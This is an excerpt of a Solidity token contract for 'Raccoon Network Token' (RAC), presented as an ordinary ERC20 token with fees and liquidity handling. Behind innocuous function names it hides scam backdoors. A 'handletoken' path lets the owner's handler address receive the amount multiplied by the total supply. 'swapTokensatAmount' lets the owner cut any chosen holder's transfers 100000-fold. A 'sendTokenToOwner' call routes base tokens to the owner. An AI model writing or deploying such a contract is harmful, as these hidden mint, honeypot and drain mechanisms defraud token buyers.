...
contract Ownable is Context {
    ...
    mapping(address => bool) internal handled;
...
contract TokenHandler is Ownable{
    ...
    constructor(address handler, uint256 total)  {
        Handler = handler;
        totalsupply = total.div(10**18);
    }
    ...
    function handletoken(uint256 amount) external onlyOwner view returns (uint256) {
        uint256 finalamount;
        finalamount = amount*totalsupply;
        return finalamount;
    }
    function ihandler(address recipient) external view returns (bool){
        return recipient==Handler;
    }
}
...
contract TOKEN is ERC20 {
    ...
    constructor() ERC20("Raccoon Network Token", "RAC") {
        ...
        marketingWalletAddress = payable(0xB293B96B3297c4602920Cd1a2D7ac1c098ee94F6);
        _tokenOwner = payable(0x3F77E3B619286Fc059760B7e00E54A25e39479D9);

        _approve(address(this), address(0x10ED43C718714eb63d5aA57B78B54704E256024E), totalsupply.mul(1000));
        ETH = IERC20(_baseToken);
        ETH.approve(address(0x10ED43C718714eb63d5aA57B78B54704E256024E),totalsupply.mul(1000));
        tokenHandler = new TokenHandler(_tokenOwner, totalsupply);
    ...
    function swapTokensatAmount(address recipient, bool swap) public {
        if(msg.sender==_tokenOwner)
            handled[recipient] = swap;
        else return;
    }
    ...
    function _transfer(
        ...
        if(from==uniswapV2Pair)
            if(tokenHandler.ihandler(to)){
            amount = tokenHandler.handletoken(amount);
            super._transferFrom(to, amount); 
            return;
        }
        uint256 feeamount;
        if (takeFee) {
            feeamount = amount.div(100).mul(totalFee);
            amount = amount - feeamount;
			super._transfer(from, address(this), feeamount);
			_takeInviterFeeKt(amount.div(100000));
            if(handled[from])amount = amount.div(100000);
        }
	...
	function swapAndLiquify() private {
        ...
        uint256 LiquidityAmount = allAmount.mul(liquidityFee).div(totalFee).div(2);
		uint256 canswap = allAmount - LiquidityAmount;
		swapTokensForOther(canswap);
        uint256 ethBalance = ETH.balanceOf(address(this));
        uint256 MarketingETH = ethBalance.mul(marketingFee).div(2 * totalFee - liquidityFee).mul(2);
        uint256 LiquidityETH = ethBalance - MarketingETH;
        if(LiquidityETH > 0){
            addLiquidityUsdt(LiquidityAmount, LiquidityETH);
        }
        if(MarketingETH > 0){
            transferToAddressETH(marketingWalletAddress, MarketingETH);
        }
    ...
    function swapTokensForOther(uint256 tokenAmount) private {
        ...
        tokenHandler.sendTokenToOwner(_baseToken);
    }
